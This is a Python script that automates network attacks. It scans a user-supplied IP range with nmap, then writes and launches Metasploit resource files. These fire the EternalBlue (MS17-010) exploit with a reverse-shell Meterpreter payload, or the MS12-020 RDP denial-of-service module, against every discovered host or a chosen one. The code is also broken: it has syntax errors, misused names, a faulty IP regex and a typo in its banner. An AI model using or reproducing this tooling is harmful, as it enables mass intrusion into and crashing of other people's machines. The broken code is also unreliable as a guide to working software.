#!/usr/bin/python3
#coding：utf-8
import os
import re

print('by 留心')
print('by 留心')
print('by 留心')
print('支持ms17070永恒之蓝和ms12020死亡蓝屏，未来支持ms08067和ms15030')
a = input("请输入你的ip段例如:192.168.1.0/24:"+"\n")
#os.system("nmap -T 5 192.168.3.0/24 >>scann.txt")
os.system("nmap -T 5 {} >>scann.txt".format(a))
print("扫描完成")



    def log_read():
        with open("scann.txt", mode="r") as f:
            result = list(set(re.findall(r"\d{3}\.\d{3}\.\d{1,3}\.\d{1,3}", f.read())))
        result = "   ".join(result)
        return result

    def ip_write_file(result):
        with open('ip.txt', 'w') as f:
            f.write(result)
        print("---存活IP---")
        os.system("cat ip.txt")
        print("\n")

ms = input("输入ms17010或者ms12020"):
if ms == ms17010:

    def config_write_file(result):
        config = open('cs.rc', 'w')
        config.write('use exploit/windows/smb/ms17_010_eternalblue' + "\n")
        config.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp' + "\n")
        config.write('set LHOST eth0'+"\n")
        config.write('set RHOSTS ')
        b = input('是否全部攻击,请输入y或者n:'+"\n")
        if b == 'y':
            for ele in result.split("  "):
                config.write(ele)
        elif b == 'n':
            c = input('请输入你要攻击的ip:'+"\n")
            config.write('set RHOSTS {}'.format(c))
        config.write("\n")
        config.write("exploit"+"\n")
        config.write("sessions -C ls"+"\n")
        config.close()
        
    def main():
        result = log_read()
        ip_write_file(result)
        config_write_file(result)

        os.system("chmod 777 cs.rc")
        print("正在调用msf开始攻击")
        mg = os.system('msfconsole -r cs.rc')
        f = open('cs.rc', 'w')
        f.close()
elif ms == ms12020;

        def config_write_file(result):
        config = open('cs.rc', 'w')
        config.write('use auxiliary/dos/windows/rdp/ms12_020_maxchannelids' + "\n")
        config.write(' set THREADS 45' + "\n")
        config.write('set LHOST eth0'+"\n")
        config.write('set RHOSTS ')
        b = input('是否全部攻击,请输入y或者n:'+"\n")
        if b == 'y':
            for ele in result.split("  "):
                config.write(ele)
        elif b == 'n':
            c = input('请输入你要攻击的ip:'+"\n")
            config.write('set RHOSTS {}'.format(c))
        config.write("\n")
        config.write("exploit"+"\n")
        config.write("sessions -C ls"+"\n")
        config.close()
if __name__ == '__main__':
        main()
